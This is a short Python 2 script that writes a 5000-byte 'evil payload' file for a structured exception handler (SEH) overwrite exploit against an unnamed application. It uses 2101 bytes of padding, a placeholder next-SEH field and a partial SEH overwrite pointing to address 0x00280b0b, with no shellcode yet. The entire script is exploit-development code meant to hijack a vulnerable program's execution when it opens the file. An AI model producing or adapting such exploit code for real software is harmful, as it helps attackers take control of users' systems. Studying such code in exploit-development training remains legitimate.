#!/usr/bin/python
import struct


nSEH = "B" * 4
#SEH = "C" * 4
SEH = "\x0b\x0b\x28" #struct.pack("<I", 0x00280b0b)

buffer  = "A" * 2101
buffer += nSEH
buffer += SEH
buffer += "D" * (5000 - len(buffer))

f=open("Payload.txt","w")
print "[+] Creating %s bytes evil payload.." %len(buffer)
f.write(buffer)
f.close()
print "[+] File created!"

